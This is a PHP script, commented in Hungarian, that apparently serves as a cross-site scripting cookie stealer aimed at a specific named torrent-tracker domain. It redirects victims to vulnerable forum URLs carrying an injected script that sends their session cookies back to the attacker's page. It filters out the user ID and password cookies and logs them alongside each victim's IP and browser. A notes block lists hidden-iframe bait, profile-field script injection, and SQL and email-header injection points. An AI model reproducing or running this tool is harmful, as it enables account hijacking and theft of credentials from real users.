<?php
/* xss daemon 1.3 (bH) */
error_reporting(0);

# BEÁLLÍTÁSOK #
$logfile = 'log.php';//logfájl neve (.php kiterjesztéssel!!!)
# $logfile = 'log'.date('ym').'.php';
  # > CHMOD 0777 log.php
$logpass = 'kalmanA';//a logfájl jelszava (új logfájl létrehozásakor beleíródik)
$domain = 'bithumen.ath.cx';//domain

$exploit = '/forums.php?action='; //sebezhető link
  # /forums.php?action=
  # /comment.php?action=
  # /friends.php?id=
  # /friends.php?action=add&targetid=10&type=
  # /friends.php?action=add&type=friend&targetid=
  # /browse.php?search=*">
  # /userhistory.php?id=ID&action= (célzott támadásra, adott user ID ellen)

# $datavar = 'd';//adatot hordozó változó neve
$datavar = date('DGMyW');
$cookiefilter = 'uid,pass';//szükséges sütik neve (vagy mindet ha üres)
$logdate = 'Y/m/d - H:i:s';//log dátum formátum (PHP date())

# $session = 1;//munkamenet azonosítója (süti értéke)
$session = date('n');
$cookiename = 'c';//a süti neve
$cookielife = 30;//süti érvényessége (nap)

$onlynested = true;//csak akkor támadunk ha oldalba ágyazott kódot hívnak be
$parent = '';//csak akkor támadunk ha innen jött (vagy mindig ha üres)
# BEÁLLÍTÁSOK #

# INFÓ #
/*
késleltetéses figyelmeztetés elrejtéséhez email mezőbe: <script>document.getElementsByTagName("center")[0].style.display="none"</script>

csali oldalba: 
 # <iframe src="daemon.php" width="0" height="0" scrolling="no" frameborder="0"></iframe>
 # <img src="daemon.php" width="0" height="0" border="0">

beállítások --> Rólad és Aláírás szövegmezőkbe: </textarea><script>
(szerkesztésnél végrehajtódik)

beállítások --> Email cím szövegdobozba: <script>
(átírás késleltetésének ideje alatt minden oldalon végrehajtódik (+beállításoknál, email mező alatt))

sql injektálás:
/viewnfo.php?id=sql

email bcc injektálás:
/email-gateway.php?id=1
*/
# INFÓ #

# ADATKIMENET #
function output() {
  //1px png
  header("Content-type: image/png");
  echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAxJREFUGFdj+P//PwAF/gL+pzWBhAAAAABJRU5ErkJggg==');
  exit;
}
# ADATKIMENET #

if($_COOKIE[$cookiename] == $session || $_GET['n'] != '') {
  output();
}
else {
  $script = preg_replace('/\?.*/i', '', $_SERVER['SCRIPT_URI']);

  if(trim($_GET[$datavar]) != '') {
    setcookie($cookiename, $session, (time() + 86400 * $cookielife), '/', $_SERVER['HTTP_HOST']);
    
    $cookievars = explode('; ', htmlentities($_GET[$datavar], ENT_QUOTES));
    if($cookiefilter != ''){
      $cookiefilter = explode(',',$cookiefilter);
      foreach($cookievars as $v) {
        $thecookie = explode('=',$v,2);
        if(array_search($thecookie[0], $cookiefilter) !== false) { $data .= '<br>'.$v; }
      }
    }
    else $data = implode('<br>',$cookievars);
    
    $ip = $_SERVER['REMOTE_ADDR'];
    $referer = htmlentities($domain, ENT_QUOTES);
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $time = date($logdate);
    $text = '<br><br><b><i>'.$time.'</i> :: '.$ip.'</b><br>Adatok: '.$agent.'<br>Visszaigazolás: <a href="'.$referer.'">'.$referer.'</a><br>Sütik: '.$data."\r\n";

    if(!file_exists($logfile)) {
      $checker = '<?php $h=\'<html><head></head><body>\';$f=\'</body></html>\';if(md5($_POST[\'p\'])!=\''.md5($logpass).'\'){if(!$_POST[\'s\']){exit($h.\'<form action="\'.$_SERVER[\'PHP_SELF\'].\'" method="post">Jelszó:&nbsp;<input type="password" name="p"><input type="submit" name="s"></form>\'.$f);}else{exit($h.\'Helytelen jelszó!<br><a href="javascript:window.history.back()"><b>Vissza</b></a>\'.$f);}} ?>';
      $file = fopen($logfile, 'a');
      fwrite($file, $checker.$text);
      fclose($file);
    }
    else {
      $file = fopen($logfile, 'a');
      fwrite($file, $text);
      fclose($file);
    }

    header('Location: '.$script.'?n=o');
    exit;
  }
  else {
    if((($parent != $_SERVER['HTTP_REFERER'] && $parent != '') || isset($_GET[$datavar])) && ($onlynested == true && !isset($_SERVER['HTTP_REFERER']))) {
      output();
    }
    else {
      $header = 'Location: http://'.htmlentities($domain, ENT_QUOTES).$exploit.'<script>document.location=\''.$script.'?'.$datavar.'=\'%2Bdocument.cookie</script>';
      //nem sebezhető részek elérése (xmlHTTP)
      //$header = 'Location: http://'.htmlentities($domain, ENT_QUOTES).$exploit.'<script type="text/javascript" src="ajaxdomainsniffer.js.php?compact=toolbars.js"></script>';

      //debug http://anonym.to/?
      header("$header");
      exit;
    }
  }
}
?>